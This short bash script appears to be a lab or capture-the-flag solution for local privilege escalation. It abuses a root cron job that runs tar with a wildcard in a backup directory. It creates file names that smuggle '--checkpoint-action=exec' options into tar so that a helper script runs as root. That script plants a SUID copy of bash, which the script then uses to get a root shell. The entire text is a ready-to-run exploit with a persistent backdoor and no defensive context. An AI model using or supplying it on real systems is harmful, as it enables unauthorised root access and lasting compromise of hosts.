#!/usr/bin/env bash
set -e

# Exploit cron wildcard backup: prepare SUID backdoor script
cat > /home/lowpriv/backup/exploit.sh << 'EOF'
#!/bin/bash
cp /usr/bin/bash /home/lowpriv/bash
chmod +s /home/lowpriv/bash
echo hello
EOF
chmod +x /home/lowpriv/backup/exploit.sh

cd /home/lowpriv/backup
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh exploit.sh'

sleep 65
/home/lowpriv/bash -p -c whoami
